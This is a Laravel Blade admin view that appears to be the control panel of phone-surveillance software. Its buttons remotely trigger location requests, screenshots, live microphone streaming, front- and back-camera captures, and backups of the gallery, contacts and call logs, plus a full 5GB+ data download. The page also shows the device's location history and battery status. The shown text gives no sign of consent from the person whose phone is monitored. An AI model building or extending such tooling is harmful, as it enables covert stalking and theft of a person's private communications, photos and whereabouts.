@extends('layouts.admin')

@section('header', 'Device Details')

@section('title', $user->name)

@section('content')
    <!-- Header -->
    <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-6 mb-8 flex flex-col md:flex-row justify-between items-start md:items-center">
        <div class="flex items-center">
            <div class="h-16 w-16 rounded-full bg-indigo-100 flex items-center justify-center text-indigo-600 font-bold text-2xl mr-4">
                {{ substr($user->name, 0, 1) }}
            </div>
            <div>
                <h1 class="text-2xl font-bold text-gray-900">{{ $user->name }}</h1>
                <p class="text-gray-500">{{ $user->email }}</p>
                <div class="mt-2 flex items-center space-x-2">
                    <span class="px-3 py-1 text-sm font-medium rounded-full {{ $user->last_location_at && $user->last_location_at->gt(now()->subMinutes(30)) ? 'bg-green-100 text-green-700' : 'bg-gray-100 text-gray-600' }}">
                        {{ $user->last_location_at && $user->last_location_at->gt(now()->subMinutes(30)) ? 'Online' : 'Offline' }}
                    </span>
                    @if($user->battery_level)
                        <span class="px-3 py-1 text-sm font-medium rounded-full {{ $user->battery_level < 20 ? 'bg-red-100 text-red-700' : 'bg-blue-50 text-blue-600' }}">
                            <i data-lucide="battery" class="inline w-3 h-3 mr-1"></i> {{ $user->battery_level }}%
                        </span>
                    @endif
                </div>
            </div>
        </div>
    <div class="mt-4 md:mt-0 flex flex-wrap gap-2">
            <button onclick="sendCommand('request_location')" class="px-4 py-2 bg-indigo-600 hover:bg-indigo-700 text-white rounded-lg font-medium transition shadow-sm flex items-center">
                <i data-lucide="map-pin" class="w-4 h-4 mr-2"></i> Location
            </button>
            <button onclick="sendCommand('screenshot')" class="px-4 py-2 bg-gray-600 hover:bg-gray-700 text-white rounded-lg font-medium transition shadow-sm flex items-center">
                <i data-lucide="camera" class="w-4 h-4 mr-2"></i> Screenshot
            </button>
            <button onclick="sendCommand('start_stream')" class="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-medium transition shadow-sm flex items-center">
                <i data-lucide="mic" class="w-4 h-4 mr-2"></i> Stream Audio
            </button>
            
            <!-- More Actions Dropdown (Simulated with simple buttons for now) -->
             <button onclick="sendCommand('capture_image', {camera_facing: 'front'})" class="px-4 py-2 bg-white border border-gray-200 hover:bg-gray-50 text-gray-700 rounded-lg font-medium transition shadow-sm flex items-center">
                <i data-lucide="user" class="w-4 h-4 mr-2"></i> Selfie
            </button>
             <button onclick="sendCommand('capture_image', {camera_facing: 'back'})" class="px-4 py-2 bg-white border border-gray-200 hover:bg-gray-50 text-gray-700 rounded-lg font-medium transition shadow-sm flex items-center">
                <i data-lucide="image" class="w-4 h-4 mr-2"></i> Photo
            </button>
            <button onclick="downloadZip()" class="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-medium transition shadow-sm flex items-center">
                <i data-lucide="download" class="w-4 h-4 mr-2"></i> Full Backup
            </button>
    </div>
    </div>

    <!-- Feedback Toast -->
    <div id="toast" class="fixed top-4 right-4 bg-gray-800 text-white px-6 py-3 rounded-lg shadow-lg transform translate-x-full transition-transform duration-300 z-50">
        Command Sent!
    </div>

    <div class="grid grid-cols-1 lg:grid-cols-3 gap-8">
        
        <!-- Main Content -->
        <div class="lg:col-span-2 space-y-8">
            <!-- Data Tabs -->
            <div class="bg-white rounded-xl shadow-sm border border-gray-100 overflow-hidden">
                 <div class="border-b border-gray-200">
                    <nav class="-mb-px flex" aria-label="Tabs">
                        <button onclick="switchTab('map')" id="tab-map" class="tab-btn w-1/4 py-4 px-1 text-center border-b-2 border-indigo-500 font-medium text-sm text-indigo-600">
                            Map
                        </button>
                        <button onclick="switchTab('media')" id="tab-media" class="tab-btn w-1/4 py-4 px-1 text-center border-b-2 border-transparent font-medium text-sm text-gray-500 hover:text-gray-700 hover:border-gray-300">
                            Gallery
                        </button>
                        <button onclick="switchTab('contacts')" id="tab-contacts" class="tab-btn w-1/4 py-4 px-1 text-center border-b-2 border-transparent font-medium text-sm text-gray-500 hover:text-gray-700 hover:border-gray-300">
                           Contacts
                        </button>
                        <button onclick="switchTab('logs')" id="tab-logs" class="tab-btn w-1/4 py-4 px-1 text-center border-b-2 border-transparent font-medium text-sm text-gray-500 hover:text-gray-700 hover:border-gray-300">
                            Call Logs
                        </button>
                    </nav>
                </div>

                <!-- Tab: Map -->
                <div id="content-map" class="tab-content p-4">
                    <div class="h-[500px] relative bg-gray-100 rounded-lg overflow-hidden">
                        @if($user->latitude && $user->longitude)
                            <iframe id="main-map" width="100%" height="100%" style="border:0" loading="lazy" allowfullscreen
                                src="https://maps.google.com/maps?q={{ $user->latitude }},{{ $user->longitude }}&z=15&output=embed">
                            </iframe>
                        @else
                            <div class="absolute inset-0 flex items-center justify-center text-gray-400">Location not available</div>
                        @endif
                    </div>
                </div>

                <!-- Tab: Media -->
                <div id="content-media" class="tab-content hidden p-6">
                    <div class="flex justify-between mb-4">
                         <h3 class="font-bold text-gray-700">Recent Media</h3>
                         <button onclick="sendCommand('backup_gallery')" class="text-xs bg-indigo-50 text-indigo-600 px-2 py-1 rounded">Request Backup</button>
                    </div>
                    <div class="grid grid-cols-2 md:grid-cols-4 gap-4">
                        @forelse($user->media as $item)
                            <div class="aspect-square bg-gray-100 rounded-lg overflow-hidden relative group">
                                @php
                                    $isImage = Str::startsWith($item->file_type, 'image') || 
                                               collect(['jpg', 'jpeg', 'png', 'gif', 'webp'])->contains(strtolower(pathinfo($item->file_path, PATHINFO_EXTENSION)));
                                @endphp
                                
                                @if($isImage)
                                    <img src="{{ Storage::url($item->file_path) }}" class="w-full h-full object-cover">
                                @else
                                    <div class="flex items-center justify-center h-full text-gray-400 bg-gray-50 border border-gray-100 rounded-lg" title="Type: {{ $item->file_type }}">
                                        @if(Str::contains($item->file_type, 'video') || collect(['mp4', 'mov', 'avi'])->contains(strtolower(pathinfo($item->file_path, PATHINFO_EXTENSION))))
                                            <i data-lucide="video" class="w-8 h-8"></i>
                                        @else
                                            <i data-lucide="file" class="w-8 h-8"></i>
                                        @endif
                                        <span class="absolute bottom-2 text-[10px]">{{ $item->file_type }}</span>
                                    </div>
                                @endif
                                <a href="{{ Storage::url($item->file_path) }}" target="_blank" class="absolute inset-0 bg-black bg-opacity-0 group-hover:bg-opacity-30 flex items-center justify-center transition opacity-0 group-hover:opacity-100">
                                    <i data-lucide="external-link" class="text-white w-6 h-6"></i>
                                </a>
                            </div>
                        @empty
                            <p class="col-span-4 text-center text-gray-400 py-8">No media found.</p>
                        @endforelse
                    </div>
                </div>

                <!-- Tab: Contacts -->
                <div id="content-contacts" class="tab-content hidden p-6">
                     <div class="flex justify-between mb-4">
                         <h3 class="font-bold text-gray-700">Contacts Backup</h3>
                         <button onclick="sendCommand('backup_contacts')" class="text-xs bg-indigo-50 text-indigo-600 px-2 py-1 rounded">Sync Contacts</button>
                    </div>
                    <div class="overflow-y-auto max-h-[500px]">
                        <table class="min-w-full divide-y divide-gray-200">
                            <thead class="bg-gray-50"><tr><th class="px-4 py-2 text-left text-xs font-medium text-gray-500">Name</th><th class="px-4 py-2 text-left text-xs font-medium text-gray-500">Number</th></tr></thead>
                            <tbody class="bg-white divide-y divide-gray-200">
                                @forelse($user->backups->where('type', 'contacts') as $backup)
                                    <!-- Parsing JSON content effectively requires decoding. Assuming simple structure or just logging for now. 
                                         Ideally Backups model should have a helper or we decode in controller. 
                                         For this simplified view, we might need to adjust logic if content is big JSON. -->
                                    <tr>
                                        <td class="px-4 py-2 text-sm text-gray-900">Backup {{ $backup->created_at->format('M d') }}</td>
                                        <td class="px-4 py-2 text-sm text-gray-500"><a href="{{ Storage::url($backup->file_path) }}" target="_blank" class="text-indigo-600 hover:underline">Download JSON</a></td>
                                    </tr>
                                @empty
                                    <tr><td colspan="2" class="px-4 py-4 text-center text-gray-500">No contact backups.</td></tr>
                                @endforelse
                            </tbody>
                        </table>
                    </div>
                </div>

                <!-- Tab: Logs -->
                <div id="content-logs" class="tab-content hidden p-6">
                    <div class="flex justify-between mb-4">
                         <h3 class="font-bold text-gray-700">Call Logs</h3>
                         <button onclick="sendCommand('backup_call_log')" class="text-xs bg-indigo-50 text-indigo-600 px-2 py-1 rounded">Sync Logs</button>
                    </div>
                     <div class="overflow-y-auto max-h-[500px]">
                        <table class="min-w-full divide-y divide-gray-200">
                             <thead class="bg-gray-50"><tr><th class="px-4 py-2 text-left text-xs font-medium text-gray-500">Date</th><th class="px-4 py-2 text-left text-xs font-medium text-gray-500">File</th></tr></thead>
                            <tbody class="bg-white divide-y divide-gray-200">
                                @forelse($user->backups->where('type', 'call_log') as $backup)
                                    <tr>
                                        <td class="px-4 py-2 text-sm text-gray-900">{{ $backup->created_at->format('M d, H:i') }}</td>
                                        <td class="px-4 py-2 text-sm text-gray-500"><a href="{{ Storage::url($backup->file_path) }}" target="_blank" class="text-indigo-600 hover:underline">Download Log</a></td>
                                    </tr>
                                @empty
                                   <tr><td colspan="2" class="px-4 py-4 text-center text-gray-500">No call logs found.</td></tr>
                                @endforelse
                            </tbody>
                        </table>
                    </div>
                </div>
            </div>
        </div>

    <script>
        function updateMap(lat, lng) {
            const iframe = document.getElementById('main-map');
            if (iframe) iframe.src = `https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
            switchTab('map');
        }
        
        function switchTab(tabName) {
            // Hide all content
            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
            // Show selected
            document.getElementById('content-' + tabName).classList.remove('hidden');
            
            // Reset buttons
            document.querySelectorAll('.tab-btn').forEach(el => {
                el.classList.remove('border-indigo-500', 'text-indigo-600');
                el.classList.add('border-transparent', 'text-gray-500');
            });
            // Highlight selected
            const btn = document.getElementById('tab-' + tabName);
            btn.classList.remove('border-transparent', 'text-gray-500');
            btn.classList.add('border-indigo-500', 'text-indigo-600');
        }

        function sendCommand(type, data = {}) {
            const url = `{{ route('admin.users.command', ['user' => $user->id, 'type' => ':type']) }}`.replace(':type', type);
            // Show toast
            const toast = document.getElementById('toast');
            toast.innerText = "Sending " + type + "...";
            toast.classList.remove('translate-x-full');

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
                },
                body: JSON.stringify(data)
            })
            .then(res => res.json())
            .then(data => {
                if(data.success) {
                    toast.innerText = "Success: " + (data.message || "Command Sent");
                    toast.classList.add('bg-green-600');
                    if(data.stream_url) {
                        window.open(data.stream_url, '_blank');
                    }
                } else {
                    toast.innerText = "Error: " + (data.error || "Failed");
                    toast.classList.add('bg-red-600');
                }
                setTimeout(() => {
                    toast.classList.add('translate-x-full');
                    // Reset toast style
                    setTimeout(() => {
                        toast.classList.remove('bg-green-600', 'bg-red-600');
                        toast.classList.add('bg-gray-800');
                    }, 300);
                }, 3000);
            })
            .catch(err => {
                toast.innerText = "Network Error";
                toast.classList.add('bg-red-600');
            });
        }

        function downloadZip() {
            const btn = document.querySelector('button[onclick="downloadZip()"]');
            const originalHtml = btn.innerHTML;
            
            // 1. Loading state
            btn.disabled = true;
            btn.innerHTML = '<i class="w-4 h-4 mr-2 animate-spin border-2 border-white border-t-transparent rounded-full"></i> Preparing (5GB+)...';
            
            const toast = document.getElementById('toast');
            toast.innerText = "Generating ZIP. This will take a few minutes for 5GB...";
            toast.classList.remove('translate-x-full');

            fetch(`{{ route('admin.users.download-zip', $user->id) }}`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'X-CSRF-TOKEN': '{{ csrf_token() }}'
                }
            })
            .then(res => res.json())
            .then(data => {
                if (data.success && data.url) {
                    toast.innerText = "Download Starting!";
                    // Trigger direct download from the public URL
                    const link = document.createElement('a');
                    link.href = data.url;
                    link.download = ''; 
                    document.body.appendChild(link);
                    link.click();
                    document.body.removeChild(link);
                } else {
                    toast.innerText = data.error || "Generation Failed";
                    toast.classList.add('bg-red-600');
                }
            })
            .catch(err => {
                toast.innerText = "Network Error";
                toast.classList.add('bg-red-600');
            })
            .finally(() => {
                btn.disabled = false;
                btn.innerHTML = originalHtml;
                setTimeout(() => {
                    toast.classList.add('translate-x-full');
                    toast.classList.remove('bg-red-600');
                }, 10000);
            });
        }
    </script>
        <div class="space-y-8">
            <!-- Device Info -->
            <div class="bg-white rounded-xl shadow-sm border border-gray-100 p-6">
                <h3 class="font-bold text-gray-800 mb-4">Device Information</h3>
                <div class="space-y-4">
                    <div class="flex justify-between py-2 border-b border-gray-50">
                        <span class="text-gray-500">Model</span>
                        <span class="font-medium">{{ $user->model ?? 'Unknown' }}</span>
                    </div>
                    <div class="flex justify-between py-2 border-b border-gray-50">
                        <span class="text-gray-500">Device ID</span>
                        <span class="font-mono text-xs text-gray-600 truncate max-w-[150px]" title="{{ $user->device_id }}">{{ $user->device_id ?? 'N/A' }}</span>
                    </div>
                    <div class="flex justify-between py-2 border-b border-gray-50">
                        <span class="text-gray-500">Charging</span>
                        <span class="font-medium {{ $user->is_charging ? 'text-green-600' : 'text-gray-600' }}">
                            {{ $user->is_charging ? 'Yes ⚡' : 'No' }}
                        </span>
                    </div>
                    <div class="flex justify-between py-2">
                        <span class="text-gray-500">Update Interval</span>
                        <span class="font-medium">{{ $user->location_update_interval ?? 30 }}m</span>
                    </div>
                </div>
            </div>

            <!-- Location History Timeline -->
            <div class="bg-white rounded-xl shadow-sm border border-gray-100 flex flex-col max-h-[600px]">
                <div class="p-4 border-b border-gray-100 bg-gray-50">
                    <h3 class="font-bold text-gray-800">Location History (Recent)</h3>
                </div>
                <div class="overflow-y-auto p-2 space-y-2 flex-1">
                    @forelse($user->device_logs as $log)
                        @if($log->latitude && $log->longitude)
                            <div onclick="updateMap({{ $log->latitude }}, {{ $log->longitude }})" 
                                 class="p-3 rounded-lg border border-gray-100 hover:bg-indigo-50 hover:border-indigo-100 cursor-pointer transition group">
                                <div class="flex justify-between items-start">
                                    <span class="font-mono text-xs text-indigo-600 font-semibold group-hover:text-indigo-700">
                                        {{ $log->created_at->format('H:i:s') }}
                                    </span>
                                    <span class="text-xs text-gray-400">{{ $log->created_at->format('M d') }}</span>
                                </div>
                                <div class="mt-1 flex items-center justify-between">
                                    <div class="text-xs text-gray-600">
                                        Battery: {{ $log->battery_level }}%
                                    </div>
                                    <div class="text-xs font-medium text-gray-400 group-hover:text-indigo-500">
                                        Click to view
                                    </div>
                                </div>
                            </div>
                        @endif
                    @empty
                        <div class="p-4 text-center text-gray-400 text-sm">No history available.</div>
                    @endforelse
                </div>
            </div>
        </div>
    </div>

    <script>
        function updateMap(lat, lng) {
            const iframe = document.getElementById('main-map');
            if (iframe) {
                iframe.src = `https://maps.google.com/maps?q=${lat},${lng}&z=15&output=embed`;
            }
        }
    </script>
@endsection
